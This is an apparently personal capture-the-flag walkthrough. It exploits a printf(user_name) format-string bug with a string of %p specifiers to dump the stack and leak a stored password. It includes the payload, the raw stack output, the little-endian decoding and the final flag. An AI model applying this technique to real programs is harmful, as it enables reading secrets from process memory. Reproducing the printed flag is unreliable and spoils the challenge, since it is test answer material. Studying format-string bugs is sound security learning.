After 1/2 hours reconstructing the code, we can see that the program does 'prinf(user_name)' at the end, we can exploit this by providing a custom format string
The simplest string we can think of is ("%s", real_pass), we will have to mess around to find the number of random values we need to pop to get it, but that should be pretty easy

So inputs should be:
"%p%p%p%p%p"...
"We don't care about password"

We need to mess around with the number of %p and we should find the password, see bruteforce.py which does it automatically
because with %p (or %x) we can print the stack, and real_pass is stored in stack, we should be able to find it

We find that we can put max 42 %p in buffer (%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p)
Analyzing the output, we find this bit:
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d
which could be the flag, we can count 40 bytes which is the length of previous flags, without 0x:
756e50523437684845414a3561733951377a7143574e6758354a35686e47587348336750664b394d
after decoding ascii (https://www.rapidtables.com/convert/number/hex-to-ascii.html), we get:
unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M

and it doesn't work

whole printed stack:
0x7fffffffe4c0(nil)0x410x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6b80x1f7ff9a080x41414141414141410x41414141414141410x41414141414141410x4141414141414141
0x41414141414141410x41414141414141410x41414141414141410x41414141414141410x41414141414141410x41414141414141410x41414141414141410x41414141414141410x0100004141
(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x70257025702570250x70257025702570250x7025702570257025
0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x7025702570257025
0x29000070250x602010(nil)0x7ffff7a3d7ed(nil)0x7fffffffe6b80x1000000000x400814(nil)0xcaecbe71af516cde

we can see [ user_pass ] [ real_pass ] [ user_name ] as expected (see addresses of buffer in reverse_engineer.c)

It might not work because printf %p remove any leading 0, so if address starts with 0 it is removed, so try adding them back (ptrs should be 8 bytes long)
anndd, they are already all there, it's weird because the output very much looks like a flag

I'm dumb, it's probably just printed in little endian, so we need to reverse eacch group of 8 bytes, like so:
4868373452506e75 51397361354a4145 58674e5743717a37 7358476e68354a35 4d394b6650673348

which gives (in ASCII):
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H